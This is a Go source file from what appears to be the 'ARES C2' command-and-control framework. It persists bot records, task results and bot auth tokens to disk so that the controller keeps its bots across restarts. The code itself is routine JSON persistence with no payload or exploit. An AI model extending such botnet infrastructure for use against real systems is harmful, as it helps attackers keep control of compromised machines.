/*
 * ARES C2 — Persistence Layer (v4.0)
 * Zero-dependency state persistence using JSON files.
 * Auto-saves bot state, task history, and results to disk.
 * Survives C2 restart without losing bots.
 */

package handler

import (
	"ares-c2/internal/models"
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"sync"
	"time"
)

// PersistentState holds all C2 state that survives restart
type PersistentState struct {
	Bots      map[string]*models.Bot          `json:"bots"`
	Results   map[string][]models.TaskResult  `json:"results"`
	BotTokens map[string]string               `json:"bot_tokens"` // v4.1 FIX: persist auth tokens
	SavedAt   time.Time                       `json:"saved_at"`
}

type Persistence struct {
	dataDir  string
	statePath string
	mu       sync.Mutex
	ticker   *time.Ticker
	stopCh   chan struct{}
}

func NewPersistence(dataDir string) *Persistence {
	return &Persistence{
		dataDir:   dataDir,
		statePath: filepath.Join(dataDir, "c2_state.json"),
		stopCh:    make(chan struct{}),
	}
}

// Load restores C2 state from disk
func (p *Persistence) Load(h *C2Handler) int {
	p.mu.Lock()
	defer p.mu.Unlock()

	data, err := os.ReadFile(p.statePath)
	if err != nil {
		return 0 // No saved state
	}

	var state PersistentState
	if err := json.Unmarshal(data, &state); err != nil {
		log.Printf("[PERSIST] Failed to parse state: %v", err)
		return 0
	}

	count := 0
	for id, bot := range state.Bots {
		// Mark stale bots
		if time.Since(bot.LastSeen) > 24*time.Hour {
			bot.Status = "dead"
		} else if time.Since(bot.LastSeen) > 5*time.Minute {
			bot.Status = "sleeping"
		}
		h.Store.Register(bot)
		_ = id
		count++
	}

	h.mu.Lock()
	for botID, results := range state.Results {
		h.Results[botID] = results
	}
	h.mu.Unlock()

	// v4.1 FIX: Restore bot tokens from persistence
	if state.BotTokens != nil {
		h.tokenMu.Lock()
		for botID, token := range state.BotTokens {
			h.BotTokens[botID] = token
		}
		h.tokenMu.Unlock()
		log.Printf("[PERSIST] Restored %d bot tokens", len(state.BotTokens))
	}

	log.Printf("[PERSIST] Restored %d bots from %s", count, state.SavedAt.Format("2006-01-02 15:04:05"))
	return count
}

// Save writes current C2 state to disk
func (p *Persistence) Save(h *C2Handler) error {
	p.mu.Lock()
	defer p.mu.Unlock()

	state := PersistentState{
		Bots:    make(map[string]*models.Bot),
		Results: make(map[string][]models.TaskResult),
		SavedAt: time.Now(),
	}

	// Snapshot bots
	for _, bot := range h.Store.List() {
		state.Bots[bot.ID] = bot
	}

	// Snapshot results
	h.mu.Lock()
	for k, v := range h.Results {
		state.Results[k] = v
	}
	h.mu.Unlock()

	// v4.1 FIX: Snapshot bot tokens
	state.BotTokens = make(map[string]string)
	h.tokenMu.RLock()
	for k, v := range h.BotTokens {
		state.BotTokens[k] = v
	}
	h.tokenMu.RUnlock()

	data, err := json.MarshalIndent(state, "", "  ")
	if err != nil {
		return err
	}

	// Atomic write: write to temp then rename
	tmpPath := p.statePath + ".tmp"
	if err := os.WriteFile(tmpPath, data, 0600); err != nil {
		return err
	}
	return os.Rename(tmpPath, p.statePath)
}

// StartAutoSave begins periodic state persistence
func (p *Persistence) StartAutoSave(h *C2Handler, interval time.Duration) {
	p.ticker = time.NewTicker(interval)
	go func() {
		for {
			select {
			case <-p.ticker.C:
				if err := p.Save(h); err != nil {
					log.Printf("[PERSIST] Auto-save failed: %v", err)
				}
			case <-p.stopCh:
				return
			}
		}
	}()
	log.Printf("[PERSIST] Auto-save every %s to %s", interval, p.statePath)
}

// Stop saves final state and stops auto-save
func (p *Persistence) Stop(h *C2Handler) {
	if p.ticker != nil {
		p.ticker.Stop()
	}
	close(p.stopCh)
	if err := p.Save(h); err != nil {
		log.Printf("[PERSIST] Final save failed: %v", err)
	} else {
		log.Printf("[PERSIST] Final state saved")
	}
}
